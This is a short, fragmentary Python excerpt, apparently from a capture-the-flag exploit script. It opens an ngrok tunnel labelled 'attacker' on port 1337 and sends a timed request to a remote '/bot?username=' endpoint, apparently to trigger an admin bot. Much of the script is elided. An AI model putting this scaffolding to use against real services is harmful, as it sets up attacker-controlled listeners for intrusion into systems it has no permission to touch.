...
PORT = 1337
ngrok.set_auth_token("YOUR NGROK TOKEN"); attacker = ngrok.connect(PORT, "http").url()
...
def startFunc():
  ...
  start = time.time()
  try:
    sess.get(remote+"/bot?username="+username,proxies=proxies,timeout=1)
